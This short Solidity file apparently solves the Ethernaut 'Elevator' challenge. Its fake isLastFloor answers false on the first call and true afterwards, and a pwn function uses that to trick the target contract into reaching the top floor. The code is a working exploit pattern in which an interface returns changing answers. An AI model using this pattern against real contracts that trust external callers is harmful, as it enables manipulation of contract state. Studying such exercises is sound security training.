// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

contract Elevator {
    uint256 public count;

    function isLastFloor(uint256 floor) public returns (bool) {
        if (count > 0) return true;
        count++;
        return false;
    }

    function pwn(address target, uint256 floor) public {
        (bool success, ) = target.call(
            abi.encodeWithSignature("goTo(uint256)", floor)
        );
        if (!success) revert CallNotSuccess();
    }
}
